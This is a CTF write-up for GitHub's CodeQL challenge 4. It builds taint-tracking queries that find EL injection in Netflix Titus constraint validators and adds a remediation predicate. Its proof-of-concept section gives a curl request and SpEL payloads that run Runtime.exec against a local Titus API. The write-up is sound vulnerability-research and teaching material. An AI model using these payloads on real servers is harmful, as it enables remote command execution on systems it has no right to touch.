# CodeQLCTF4

In this README you can find the questions of the original CTF and the answers just below every section, also the repository contains the final queries for every major step.

## Step 1: Data flow and taint tracking analysis

### Step 1.1: Sources
The sources of tainted data are the bean properties that go through constraint validation. In the code, these can be found as the first argument of a call to  `ConstraintValidator.isValid(...)`.

Write a CodeQL predicate that identifies these call arguments:

```ql
predicate isSource(DataFlow::Node source) { /* TODO describe source */ }
```

To test your predicate, use the  **Quick Evaluation**  command (Right-click >  `CodeQL: Quick Evaluation`). You should get 8 results.

**Hints:**

-   There is a convenient class  [`RemoteFlowSource`](https://github.com/github/codeql/blob/b6a7ab8bf4a9b1f6e3a95fdfe7be852c03061eab/java/ql/src/semmle/code/java/dataflow/FlowSources.qll#L25)  that tells you when a particular data flow node is obtained from remote user input.
-   Pay attention to get only results that pertain to the project source code.

#### Bonus

_This optional improvement will be taken into account only for distinguishing submissions that are very close in quality and completeness._

You will notice that this implementation will mark every validated bean property as a source of taint. But we want to get only the user-controlled sources. We are not interested in bean properties that an attacker cannot control, such as when the bean comes from unmarshaling an application configuration file.

Consider improving your predicate so we only consider cases where the bean type is bound to user-controllable data such as a JAX-RS endpoint.

### Step 1.1: Sources - Solution
There are multiple ways to implement this, using classes, predicates or straight into the isSource predicate, in my case I decided to map the ConstraintValidator class and the isValid method using classes and the use this classes in the isSource predicate.

```ql
import java
import semmle.code.java.dataflow.DataFlow

/*
Map overrides of isValid method from ConstraintValidator
*/
class ConstraintValidator extends RefType {
	ConstraintValidator() {
		this.getQualifiedName().regexpMatch("javax.validation.ConstraintValidator(.*?)")
	}
}

class ConstraintValidatorIsValid extends Method {
	ConstraintValidatorIsValid() {
		this.getName() = "isValid" and
		this.getDeclaringType().getASupertype() instanceof ConstraintValidator
	}
}

predicate isSource(DataFlow::Node source) {
	exists(ConstraintValidatorIsValid isValidMethod |
		source.asParameter() = isValidMethod.getParameter(0)
	)
}

//There has to be a query in scope even when you use Quick Evaluation
select 1
```

A quick evaluation of isSource should mark as source nodes the first parameter of the isValid method in classes that implements ConstraintValidator.


### Step 1.2: Sink

The injection sinks we are considering occur as the first argument of a call to  `ConstraintValidatorContext.buildConstraintViolationWithTemplate(...)`.

Write a CodeQL predicate to identify these sinks.
```ql
predicate isSink(DataFlow::Node sink) { /* TODO describe sink */ }
```
Quick evaluation of your predicate should give you 5 results.

### Step 1.2: Sink - Solution
Same as before there are quite a few ways to implement this, in this case I decided to go with a class to map the method BuildConstraintViolationWithTemplate from ConstraintValidatorContext and then put the rest of the login in the isSink predicate.

```ql
import java
import semmle.code.java.dataflow.DataFlow

/**
Map ConstraintValidatorContext.BuildConstraintViolationWithTemplate.
*/
class BuildConstraintViolationWithTemplate extends Method {
	BuildConstraintViolationWithTemplate() {
		this.hasName("buildConstraintViolationWithTemplate") and
		this.getDeclaringType().hasName("ConstraintValidatorContext")
	}
}

predicate isSink(DataFlow::Node sink) {
	exists(MethodAccess  callTobuildConstraintViolationWithTemplate |
		callTobuildConstraintViolationWithTemplate.getMethod() instanceof BuildConstraintViolationWithTemplate and
		sink.asExpr() = callTobuildConstraintViolationWithTemplate.getArgument(0)
	)
}

//There has to be a query in scope even when you use Quick Evaluation
select 1
```

A quick evaluation of isSink should mark as sink nodes the first argument of calls to the method ConstraintValidatorContext.buildConstraintViolationWithTemplate() 


### Step 1.3: TaintTracking configuration
Before going any further, we recommend that you quick-eval your  `isSource`  and  `isSink`  predicates to make sure both are matching the issue described above in  `SchedulingConstraintSetValidator.java`. This case will be our main target issue for the rest of this challenge.

All done? Ok, so now let's find this vulnerable path by tracking the tainted data!

You'll need to create a taint tracking configuration as explained in the  [CodeQL documentation](https://help.semmle.com/QL/learn-ql/java/dataflow.html#global-data-flow). Fill in the template below with your definitions of  `isSource`  and  `isSink`, and a nicer name. The predicate  `hasFlowPath`  will hold for any path through which data can flow from your sources to your sinks. As you checked that your predicates give you the correct sources and sinks, we'll get our vulnerability.

```ql
/** @kind path-problem */
import java
import semmle.code.java.dataflow.TaintTracking
import DataFlow::PathGraph

class MyTaintTrackingConfig extends TaintTracking::Configuration {
    MyTaintTrackingConfig() { this = "MyTaintTrackingConfig" }

    override predicate isSource(DataFlow::Node source) { 
        // TODO 
    }

    override predicate isSink(DataFlow::Node sink) { 
        // TODO 
    }
}

from MyTaintTrackingConfig cfg, DataFlow::PathNode source, DataFlow::PathNode sink
where cfg.hasFlowPath(source, sink)
select sink, source, sink, "Custom constraint error message contains unsanitized user data"
```

Run your query using the command  `CodeQL: Run Query`  (either in the Command Palette or the right-click menu). It should give you ...  **0 results**! Ok, this is disappointing! But don't give up just now.

### Step 1.3: TaintTracking configuration - Solution
Not much to say for this one, just copy paste the previous steps into the provided template.

```ql
import java
import semmle.code.java.dataflow.TaintTracking
import DataFlow::PathGraph

/**
Map overrides of isValid method from ConstraintValidator
*/
class ConstraintValidator extends RefType {
	ConstraintValidator() {
		this.getQualifiedName().regexpMatch("javax.validation.ConstraintValidator(.*?)")
	}
}

class ConstraintValidatorIsValid extends Method {
	ConstraintValidatorIsValid() {
		this.getName() = "isValid" and
		this.getDeclaringType().getASupertype() instanceof  ConstraintValidator
	}
}

/**
Map ConstraintValidatorContext.BuildConstraintViolationWithTemplate
*/
class BuildConstraintViolationWithTemplate extends Method {
	BuildConstraintViolationWithTemplate() {
		this.hasName("buildConstraintViolationWithTemplate") and
		this.getDeclaringType().hasName("ConstraintValidatorContext")
	}
}

class UnsafeErrorGeneration extends TaintTracking::Configuration {
	UnsafeErrorGeneration() { this = "UnsafeErrorGeneration" }
	
	override predicate isSource(DataFlow::Node source) {
		exists(ConstraintValidatorIsValid isValidMethod|
			source.asParameter() = isValidMethod.getParameter(0)
		)
	}
	
	override predicate isSink(DataFlow::Node sink) {
		exists(MethodAccess callTobuildConstraintViolationWithTemplate |
			callTobuildConstraintViolationWithTemplate.getMethod() instanceof  BuildConstraintViolationWithTemplate  and
			sink.asExpr() = callTobuildConstraintViolationWithTemplate.getArgument(0)
		)
	}
}

from UnsafeErrorGeneration cfg, DataFlow::PathNode source, DataFlow::PathNode sink
where cfg.hasFlowPath(source, sink)
select sink, source, sink, "Custom constraint error message contains unsanitized user data"
```


### Step 1.4: Partial Flow to the rescue

When developing taint tracking queries, we may find ourselves in this situation very often. Why aren't we getting a hit?

We identified the source and the sink, so this suggests that our analysis is missing a step along the path from the source to the sink.

CodeQL's Java libraries can help us find the missing gaps with the  **partial data flow**  debugging mechanism. This feature allows you to look for flows from a given source to any possible sink, leaving the sink unconstrained while limiting the number of steps away from the source to search for. So you can use this feature to track the flow of tainted data from your source to all possible sinks, and see where the flow stops being tracked further.

Create a debugging query that uses the  [`hasPartialFlow`  predicate](https://github.com/github/codeql/blob/master/java/ql/src/semmle/code/java/dataflow/internal/DataFlowImpl.qll#L124). You can use the template below.

```ql
/** @kind path-problem */
import java
import semmle.code.java.dataflow.TaintTracking
import DataFlow::PartialPathGraph // this is different!

class MyTaintTrackingConfig extends TaintTracking::Configuration {
    MyTaintTrackingConfig() { ... } // same as before
    override predicate isSource(DataFlow::Node source) { ... } // same as before
    override predicate isSink(DataFlow::Node sink) { ... } // same as before
    override int explorationLimit() { result =  10} // this is different!
}
from MyTaintTrackingConfig cfg, DataFlow::PartialPathNode source, DataFlow::PartialPathNode sink
where
  cfg.hasPartialFlow(source, sink, _) and
  source.getNode() = ... // TODO restrict to the one source we are interested in, for ease of debugging
select sink, source, sink, "Partial flow from unsanitized user data"

predicate partial_flow(PartialPathNode n, Node src, int dist) {
  exists(MyTaintTrackingConfig conf, PartialPathNode source |
    conf.hasPartialFlow(source, n, dist) and
    src = source.getNode() and
    source =  // TODO - restrict to THE source we are interested in
  )
}
```

Run your modified query to explore the flow of data and detect where the path stops.

**Tips:**

-   Still don't get any results? Make sure to read the documentation of the  `hasPartialFlow`  predicate carefully and adapt your taint tracking configuration accordingly.
-   You can add other variables that you'd need for your analysis using the  `exists`  keyword, or as parameters of your  `from`  clause. For example, you could restrict to only source and sink nodes in a particular enclosing function or file location.This will help you quickly filter your results to only the ones your interested in.

### Step 1.4: Partial Flow to the rescue - Solution
Again the changes are quite simple for this step, just adapt the previous query to the provided template and add some filters by filenames.

```ql
/** @kind path-problem */
import  java
import  semmle.code.java.dataflow.TaintTracking
import  DataFlow::PartialPathGraph  // this is different!

/**
Map overrides of isValid method from ConstraintValidator
*/
class ConstraintValidator extends RefType {
	ConstraintValidator() {
		this.getQualifiedName().regexpMatch("javax.validation.ConstraintValidator(.*?)")
	}
}

class ConstraintValidatorIsValid extends Method {
	ConstraintValidatorIsValid() {
		this.getName() = "isValid"  and
		this.getDeclaringType().getASupertype() instanceof  ConstraintValidator
	}
}

/**
Map ConstraintValidatorContext.BuildConstraintViolationWithTemplate
*/
class BuildConstraintViolationWithTemplate extends Method {
	BuildConstraintViolationWithTemplate() {
		this.hasName("buildConstraintViolationWithTemplate") and
		this.getDeclaringType().hasName("ConstraintValidatorContext")
	}
}

class UnsafeErrorGeneration extends TaintTracking::Configuration {
	UnsafeErrorGeneration() { this = "UnsafeErrorGeneration" }
	
	override predicate isSource(DataFlow::Node source) {
		exists(ConstraintValidatorIsValid isValidMethod|
			source.asParameter() = isValidMethod.getParameter(0)
		)
	}
	
	override predicate isSink(DataFlow::Node sink) {
		exists(MethodAccess callTobuildConstraintViolationWithTemplate |
			callTobuildConstraintViolationWithTemplate.getMethod() instanceof  BuildConstraintViolationWithTemplate  and
			sink.asExpr() = callTobuildConstraintViolationWithTemplate.getArgument(0)
		)
	}

	override int explorationLimit() { result = 10}
}

from UnsafeErrorGeneration cfg, DataFlow::PartialPathNode  source, DataFlow::PartialPathNode sink
where
	cfg.hasPartialFlow(source, sink, _) and
	source.getNode().getLocation().getFile().getStem() = "SchedulingConstraintSetValidator"  //Filter to only source nodes in the file we are interested in
select sink, source, sink, "Partial flow from unsanitized usedr data"
```

The only substantial change is the addition in the where clausure to filter by the file name that we are interested in, using ``source.getNode().getLocation().getFile().getStem() = "SchedulingConstraintSetValidator"``, this way it becomes easier to work with resulting partial flows.


### Step 1.5: Identifying a missing taint step
You must have found that CodeQL does not propagate taint through getters like  `container.getHardConstraints`  and  `container.getSoftConstraints`. Can you guess why this default behaviour was implemented?

### Step 1.5: Identifying a missing taint step - Solution
My understanding of this os that CodeQL doesn't propagate taint through getters to prevent false positives. Imagine for example that we have an object, some of the properties of the object are user-controlled, but some others are not. Now we have a sink in the first parameter of a function that receives a call to a getter of our object, for CodeQL is not possible to know if the getter of this object is obtaining the properties that we are interested in (The user-controlled ones) or just any of the other random properties, because of this CodeQL decide to not propagate through getters unless you specify it.


### Step 1.6: Adding additional taint steps

Now you know that some taint steps are missing. This is because the analysis is careful by default, and tries not to give you extra flow that may lead to false positives. Now you need to tell your taint tracking configuration that tainted data can be propagated by certain code patterns.

CodeQL allows you to declare additional taint steps in a specific taint tracking configuration, as shown  [in this example](https://github.com/github/codeql/blob/master/docs/language/ql-training/java/global-data-flow-java.rst#defining-additional-taint-steps).

However, we'll use an even more general approach, which allows us to add taint steps globally, so that they can be picked up by several taint tracking configurations (and potentially reused in many queries). For this you just have to extend the class  [TaintTracking::AdditionalTaintStep](https://github.com/github/codeql/blob/bc7163aa68017f93c25ec7423044727a5d785142/java/ql/src/semmle/code/java/dataflow/internal/TaintTrackingUtil.qll#L67)  and implement the  `step`  predicate. The  `step`  predicate should hold true when tainted data flows from  `node1`  to  `node2`.

Run your  **original**  query again after adding a taint step. Did you get the expected results? Still no.

Re-run your  **partial flow**  query again, to find where you lost track of your tainted data this time.

**Hints:**  In the  `step`  predicate you should indicate that the 2 nodes are 2 elements of a  `MethodAccess`: one will be an argument and one will be the return value found at the call site.

### Step 1.6: Adding additional taint steps - Solution
This is probably one of the parts that I enjoyed the most since I didn't know about custom taint tracking steps before.

The implementation is quite simple, we create a new class that extends AdditionalTaintStep that contains a step predicate, this predicate expect two nodes as arguments that we will call node1 and node2.
We are trying to map something like this ```sink(source.getSoftConstraints())```
So in this case we need to tell the taint tracking configuration that the node1 is the qualifier of a method access, since `getSoftConstraints` is a method of the source object and the second node will be the return of this method call. 
This will consider a call to any method of source a sink, and even that this can be interesting for manual audits it can introduce a lot of false positives as explained in the previous section, so we need to add a filter for the methods that we are interested in, in this case `getSoftConstraints` and `keySet`.

```ql
class CustomSteps extends TaintTracking::AdditionalTaintStep {
	override predicate step(DataFlow::Node node1, DataFlow::Node node2) {
		exists(MethodAccess ma|
			(ma.getMethod().hasName("getSoftConstraints") or
			ma.getMethod().hasName("keySet"))
			and
			node1.asExpr() = ma.getQualifier() and
			node2.asExpr() = ma
		)
	}
}
```

If we run the entire query we are not going to get any results, since we need to add some more custom steps as can be seen in the following section, but this custom step can be tried out using Quick Evaluation.


### Step 1.7: Adding taint steps through a constructor

Repeat the process above with all the methods that interrupt the taint tracking, until your partial flow predicate takes you finally to the call to constructor  `HashSet`.

Now you observe that CodeQL does not propagate through the  `HashSet`  constructor. Write an additional taint step for this and re-run your query.

### Step 1.7: Adding taint steps through a constructor - Solution

Now that our query propagates through some methods of the source we have another problem, by default the taint tracking don't propagate through an instantiation of a new object. So we need to create a step predicate where the node1 will be the first argument of a call to the constructor of hashset and the node2 will be the result of this constructor call.

```ql
class CustomSteps2 extends TaintTracking::AdditionalTaintStep {
	override predicate step(DataFlow::Node node1, DataFlow::Node node2) {
		exists(ConstructorCall newHashSet |
			newHashSet.getConstructor().hasName("HashSet<String>") and
			node1.asExpr() = newHashSet.getArgument(0) and
			node2.asExpr() = newHashSet
		)
	}
}
```

### Step 1.8: Finish line for our first issue

Repeat the process above by adding more additional taint steps as needed, until your tainted data flows to the argument of the call to  `buildConstraintViolationWithTemplate`. Run your query.

Hurray! The issue should be reported now!

### Step 1.8: Finish line for our first issue - Solution
Just mix all the previous steps all together.

```ql
import java
import semmle.code.java.dataflow.TaintTracking
import DataFlow::PathGraph

/**
Map overrides of isValid method from ConstraintValidator
*/
class ConstraintValidator extends RefType {
  ConstraintValidator() {
      this.getQualifiedName().regexpMatch("javax.validation.ConstraintValidator(.*?)")
  }
}

class ConstraintValidatorIsValid extends Method {
    ConstraintValidatorIsValid() {
        this.getName() = "isValid" and
        this.getDeclaringType().getASupertype() instanceof ConstraintValidator
    }
}

/**
Map ConstraintValidatorContext.BuildConstraintViolationWithTemplate
*/
class BuildConstraintViolationWithTemplate extends Method {
	BuildConstraintViolationWithTemplate() {
		this.hasName("buildConstraintViolationWithTemplate") and
		this.getDeclaringType().hasName("ConstraintValidatorContext")
	}
}

class UnsafeErrorGeneration extends TaintTracking::Configuration {
    UnsafeErrorGeneration() { this = "UnsafeErrorGeneration" }

    override predicate isSource(DataFlow::Node source) { 
        exists(ConstraintValidatorIsValid isValidMethod|
        source.asParameter() = isValidMethod.getParameter(0)
    )
    }

    override predicate isSink(DataFlow::Node sink) { 
		exists(MethodAccess callTobuildConstraintViolationWithTemplate |
			callTobuildConstraintViolationWithTemplate.getMethod() instanceof  BuildConstraintViolationWithTemplate  and
			sink.asExpr() = callTobuildConstraintViolationWithTemplate.getArgument(0)
		)
    }
}

class CustomSteps extends TaintTracking::AdditionalTaintStep {
    override predicate step(DataFlow::Node node1, DataFlow::Node node2) {
        exists(MethodAccess ma|
            (ma.getMethod().hasName("getSoftConstraints")  or
            ma.getMethod().hasName("keySet"))
            and
            node1.asExpr() = ma.getQualifier() and
            node2.asExpr() = ma
        ) 
    }
}

class CustomSteps2 extends TaintTracking::AdditionalTaintStep {
    override predicate step(DataFlow::Node node1, DataFlow::Node node2) {
        exists(ConstructorCall newHashSet |
            newHashSet.getConstructor().hasName("HashSet<String>") and
            node1.asExpr() = newHashSet.getArgument(0) and
            node2.asExpr() = newHashSet
        ) 
    }
}

from UnsafeErrorGeneration cfg, DataFlow::PathNode source, DataFlow::PathNode sink
where cfg.hasFlowPath(source, sink)
select sink, source, sink, "Custom constraint error message contains unsanitized user data"
```

## Step 2: Second Issue

There is a similar issue in  `SchedulingConstraintValidator.java`. Following the same process as above, find out why it is not reported by your query, and write the necessary taint steps to report it.

**Tip:**  We don't like duplicate code. ;-)

## Step 2: Second Issue - Solution

The problem with the issue in `SchedulingConstraintValidator.java` is that there are some more calls to methods of the source that we are not covering with our custom step, more specifically `stream`, `map` and `collect`. To fix this we can just add them to our first step predicate so we don't need to duplicate code, ending with the following query that should be able to detect both issues in the codebase.

```ql
import java
import semmle.code.java.dataflow.TaintTracking
import DataFlow::PathGraph

/**
Map overrides of isValid method from ConstraintValidator
*/
class ConstraintValidator extends RefType {
  ConstraintValidator() {
      this.getQualifiedName().regexpMatch("javax.validation.ConstraintValidator(.*?)")
  }
}

class ConstraintValidatorIsValid extends Method {
    ConstraintValidatorIsValid() {
        this.getName() = "isValid" and
        this.getDeclaringType().getASupertype() instanceof ConstraintValidator
    }
}

/**
Map ConstraintValidatorContext.BuildConstraintViolationWithTemplate
*/
class BuildConstraintViolationWithTemplate extends Method {
	BuildConstraintViolationWithTemplate() {
		this.hasName("buildConstraintViolationWithTemplate") and
		this.getDeclaringType().hasName("ConstraintValidatorContext")
	}
}


class CustomSteps extends TaintTracking::AdditionalTaintStep {
    override predicate step(DataFlow::Node node1, DataFlow::Node node2) {
        exists(MethodAccess ma|
            (ma.getMethod().hasName("getSoftConstraints") or
            ma.getMethod().hasName("keySet") or
            ma.getMethod().hasName("stream") or
            ma.getMethod().hasName("map") or
            ma.getMethod().hasName("collect")
            )
            and
            node1.asExpr() = ma.getQualifier() and
            node2.asExpr() = ma
        ) 
    }
}

class CustomSteps2 extends TaintTracking::AdditionalTaintStep {
    override predicate step(DataFlow::Node node1, DataFlow::Node node2) {
        exists(ConstructorCall newHashSet |
            newHashSet.getConstructor().hasName("HashSet<String>") and
            node1.asExpr() = newHashSet.getArgument(0) and
            node2.asExpr() = newHashSet
        ) 
    }
}

class UnsafeErrorGeneration extends TaintTracking::Configuration {
    UnsafeErrorGeneration() { this = "UnsafeErrorGeneration" }

    override predicate isSource(DataFlow::Node source) { 
        exists(ConstraintValidatorIsValid isValidMethod|
        source.asParameter() = isValidMethod.getParameter(0)
    )
    }

    override predicate isSink(DataFlow::Node sink) { 
		exists(MethodAccess callTobuildConstraintViolationWithTemplate |
			callTobuildConstraintViolationWithTemplate.getMethod() instanceof  BuildConstraintViolationWithTemplate  and
			sink.asExpr() = callTobuildConstraintViolationWithTemplate.getArgument(0)
		)
    }
}

from UnsafeErrorGeneration cfg, DataFlow::PathNode source, DataFlow::PathNode sink
where cfg.hasFlowPath(source, sink)
select sink, source, sink, "Custom constraint error message contains unsanitized user data"
```

## Step 3: Errors and Exceptions

Since this sink is associated with generating error messages, there are many cases where they will be generated from an exception message in flows such as:

```java
try {
    parse(tainted);
} catch (Exception e) {
    sink(e.getMessage())
}
```

Our current query does not cover this case. An accurate taint step would require analyzing the implementation of the throwing method to determine if the tainted input is actually reflected in the exception message.

Unfortunately, our CodeQL database identifies calls to library methods and their signatures, but does not have the source code of the implementations of those methods. So we need to model what they do. Write an additional taint step for these cases.

**Note:**  In order to test your additional taint step, use quick evaluation on its  `step`  predicate to check if it detects the above pattern as you expect. Our current codebase doesn't contain cases of user-controlled beans flowing to these exception message pattern, so you won't be able to test your new taint step by running the whole query. Your query should continue to find only the same 2 results.

**Hints:**

-   Read the documentation for the classes  `TryStmt`  and  `CatchClause`  in the CodeQL Java library. Use jump-to-definition or hovers in the IDE to see their definition.
-   You will have to restrict to  `CatchClause`s that write an exception by calling specific methods.
-   Use a heuristic to decide which of those methods write error messages.
- 
## Step 3: Errors and Exceptions - Solution
This is the step Im less sure about since I still have some doubts about my solution, Im looking forward for some feedback and can't wait to see the expected solution.

```ql
class CustomStepsTry extends TaintTracking::AdditionalTaintStep {
    override predicate step(DataFlow::Node node1, DataFlow::Node node2) {
        exists(TryStmt ts, MethodAccess parse, CatchClause cc, MethodAccess message|
            //Get a parse method call inside a try clausule.
            ts.getBlock() = parse.getEnclosingStmt().getEnclosingStmt() and
            parse.getMethod().hasName("parse") and
            //Set the first node as the arg 0 of parse.
            node1.asExpr() = parse.getArgument(0) and
            //Get a catch clausule of the try and check if it calls potential methods 
            //that will return the first parameter of parse
            ts.getACatchClause() = cc and
            message.getBasicBlock() = cc and
            (message.getMethod().hasName("getMessage") or
            message.getMethod().hasName("getLocalizedMessage") or
            message.getMethod().hasName("toString")
            ) and
            //Set the return of the method call as the node2
            node2.asExpr() = message
        ) 
    }
}
```

First the enclosing statement of a method access (parse) is extracted to see if it is inside of a try block, for method accesses where this is true the node1 is set to the first argument of the parse method.
After this the catch clauses of the try are selected and if a method access to the methods `getMessage`, `getLocalizedMessage` or `toString` is performed inside any of this catch clauses the method access is marked as the node2

Searching for other codebases with similar issues I found SpringXD, unfortunately the project is not longer maintained.
https://github.com/spring-projects/spring-xd/blob/ec106725c51d245109b2e5055d9f65e43228ecc1/spring-xd-module-spi/src/main/java/org/springframework/xd/module/options/validation/CronExpression.java#L81

The only difference is that in this case the node1 would be a constructor call instead of a MethodAccess.


## Step 4: Exploit and remediation

### Step 4.1: PoC
Write a working PoC for it. You can use the official  [Docker images](https://github.com/Netflix/titus-control-plane/blob/master/docker-compose.yml).

### Step 4.1: PoC - Solution
To be able to write an exploit first we need to know where the validator is used, after some digging in the source code it can be seen that they are used in the properties softConstraints and hardConstraints of the Constainer class (https://github.com/Netflix/titus-control-plane/blob/d7012f6ada31e544117e1c85737bd09106686a1a/titus-api/src/main/java/com/netflix/titus/api/jobmanager/model/job/Container.java#L83)

After some more digging of the api endpoints it was noted that a container object is provided by the user when a new job is created, so a request to create a job task was crafted (An example for this request can be found in the README of the Titus repository, but it needs some modification to contain constraints).

The following curl request contains a constraint with the name `#{1+1}` the validator is not going to find this name in the list of constraints names and due to this an error containing our template name is going to be created by using `buildConstraintViolationWithTemplate`
```curl
curl --location --request POST 'localhost:7001/api/v3/jobs' \
--header 'Content-Type: application/json' \
--data-raw '{
    "applicationName": "localtest",
    "owner": {
        "teamEmail": "me@me.com"
    },
    "container": {
        "image": {
            "name": "alpine",
            "tag": "latest"
        },
        "entryPoint": [
            "/bin/sleep",
            "1h"
        ],
        "securityProfile": {
            "iamRole": "test-role",
            "securityGroups": [
                "sg-test"
            ]
        },
        "softConstraints": {
            "constraints": {
                "#{1+1}": "aa"
            }
        }
    },
    "batch": {
        "size": 1,
        "runtimeLimitSec": "3600",
        "retryPolicy": {
            "delayed": {
                "delayMs": "1000",
                "retries": 3
            }
        }
    }
}'
```

This should result in 
```json
{
"statusCode": 400,
"message": "Invalid Argument: {Validation failed: 'field: 'container.softConstraints', description: 'Unrecognized constraints [2]', type: 'HARD''}"
}
```

At this point, more complex SpEL payloads can be crafted to execute arbitrary commands.

*Advisory: has being a long time since I done something 'deep' with java so there are a lot of probably wrong assumptions here.*

Testing some payloads I notice the error `"Unexpected error: HV000149: An exception occurred during message interpolation"`. So I decided to inspect the class name by using `"#{#this.class.name}"` as a key name, if you remember from previous paragraphs the validation occurs in the Container class, but instead of this we see the following `com.google.common.collect.SingletonImmutableBiMap`. Im not 100% sure about why this happens so I decides to debug by trial an error :)

From our query we have two vulnerable `isValid` method, one is a validation of the key name against a list of keys and another one is a validation to see if keys are duplicated in the soft and hard constraints, so I decides to try and trigger the second one.

this can be done adding a new line after the soft constrains with the following
```json
"softConstraints": {"constraints":{"#{#this.class.name}":"aa"}},
"hardConstraints": {"constraints":{"#{#this.class.name}":"aa"}}
```

Resulting in the following message
```json
"Invalid Argument: {Validation failed: 'field: 'container.hardConstraints', description: '[+] Unrecognized constraints [com.google.common.collect.SingletonImmutableBiMap]', type: 'HARD''}, {Validation failed: 'field: 'container.softConstraints', description: '[+] Unrecognized constraints [com.google.common.collect.SingletonImmutableBiMap]', type: 'HARD''}, {Validation failed: 'field: 'container', description: 'Soft and hard constraints not unique. Shared constraints: [com.netflix.titus.api.jobmanager.model.job.Container]', type: 'HARD''}"
```

In this case we can see again the `com.google.common.collect.SingletonImmutableBiMap` but also the Container class `com.netflix.titus.api.jobmanager.model.job.Container`.

So to prevent our payload from failing we can do the following

```json
"softConstraints": {"constraints":{"#{#this.class.name.substring(0,10) == 'com.google' ? 'FOO' : 'BAR'}":"aa"}},
"hardConstraints": {"constraints":{"#{#this.class.name.substring(0,10) == 'com.google' ? 'FOO' : 'BAR'}":"aa"}}
```

Resulting in the following

```
"Invalid Argument: {Validation failed: 'field: 'container', description: 'Soft and hard constraints not unique. Shared constraints: [BAR]', type: 'HARD''}, {Validation failed: 'field: 'container.hardConstraints', description: '[+] Unrecognized constraints [foo]', type: 'HARD''}, {Validation failed: 'field: 'container.softConstraints', description: '[+] Unrecognized constraints [foo]', type: 'HARD''}"
```

Printing foo where the class is anything inside `com.google` and bar for anything else, the Container class in this case.

Now we can replace bar for our payload.
```json
"softConstraints": {"constraints":{"#{#this.class.name.substring(0,10) == 'com.google' ? 'FOO' : T(java.lang.Runtime).getRuntime().exec('touch /tmp/test')}":"aa"}},
"hardConstraints": {"constraints":{"#{#this.class.name.substring(0,10) == 'com.google' ? 'FOO' : T(java.lang.Runtime).getRuntime().exec('touch /tmp/test')}":"aa"}}
```

However this result in errors during interpolation.
```
"Unexpected error: HV000149: An exception occurred during message interpolation"
```

Again this is just a guess, but my thinking was that the output of this exec call can't be used as a valid value to build the final message so the interpolation fails, so what I did was calling class name in the exec call, the problem with this is that the execution is going to be completely blind.

```json
"softConstraints": {"constraints":{"#{#this.class.name.substring(0,10) == 'com.google' ? 'FOO' : T(java.lang.Runtime).getRuntime().exec('touch /tmp/test').class.name}":"aa"}},
"hardConstraints": {"constraints":{"#{#this.class.name.substring(0,10) == 'com.google' ? 'FOO' : T(java.lang.Runtime).getRuntime().exec('touch /tmp/test').class.name}":"aa"}}
```

Resulting is something more promising
```
"Invalid Argument: {Validation failed: 'field: 'container.softConstraints', description: '[+] Unrecognized constraints [foo]', type: 'HARD''}, {Validation failed: 'field: 'container', description: 'Soft and hard constraints not unique. Shared constraints: [java.lang.UNIXProcess]', type: 'HARD''}, {Validation failed: 'field: 'container.hardConstraints', description: '[+] Unrecognized constraints [foo]', type: 'HARD''}"
```


Hopefully I did not wrote a lot of nonsense stuff, can't wait to see the solution to properly learn more about this.

### Step 4.2: Remediation

Download a  [database of the patched code](https://lgtm.com/projects/g/Netflix/titus-control-plane/ci/#ql), import it into VS Code, and run your query to verify that it no longer reports the issue.

Our advisory contains other remediation techniques. Modify your query so it can be more precise or catch more variants of the vulnerability. For example, consider handling cases that disable the Java EL interpolation and only use  `ParameterMessageInterpolator`.

### Step 4.2: Remediation - Solution
A small predicate can be created to return true only if EL message interpolation has not been disabled so you can prevent false positives this way.

```ql
predicate isELInterpolationNotDisabled(){
    not exists(MethodAccess ma, ConstructorCall cc |
    ma.getMethod().hasName("messageInterpolator") and
    cc.getConstructor().hasName("ParameterMessageInterpolator") and
    ma.getArgument(0) = cc 
    )
}
```

Then this predicate can be used in the where clause of our query like this.
```ql
from UnsafeErrorGeneration cfg, DataFlow::PathNode source, DataFlow::PathNode sink
where cfg.hasFlowPath(source, sink) and
isELInterpolationNotDisabled()
select sink, source, sink, "Custom constraint error message contains unsanitized user data"
```

